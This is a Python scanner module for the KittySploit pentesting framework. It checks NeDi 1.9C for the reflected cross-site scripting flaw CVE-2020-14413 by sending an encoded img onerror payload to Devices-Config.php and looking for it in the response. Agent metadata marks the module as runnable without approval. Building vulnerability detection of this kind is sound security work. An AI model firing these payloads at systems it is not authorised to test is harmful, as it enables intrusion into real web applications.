#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NeDi 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NeDi 1.9C - Cross-Site Scripting Detection',
        'description': 'NeDi 1.9C is vulnerable to cross-site scripting because of an incorrect implementation of sanitize() in inc/libmisc.php. This function attempts to escape the SCRIPT tag from user-controllable values, but can be easily bypassed, as demonstrated by an onerror attribute of an IMG element as a Devices-Config.php?sta= value.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'nedi', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://gist.github.com/farid007/8db2ab5367ba00e87f9479b32d46fea8',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-14413',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2020-14413',
    }

    def run(self):
        r = self.http_request(method="GET", path='/Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<img src=x onerror=alert(document.domain)>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="NeDi 1.9C - Cross-Site Scripting detected",
                path='/Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E',
            )
            return True
        return False

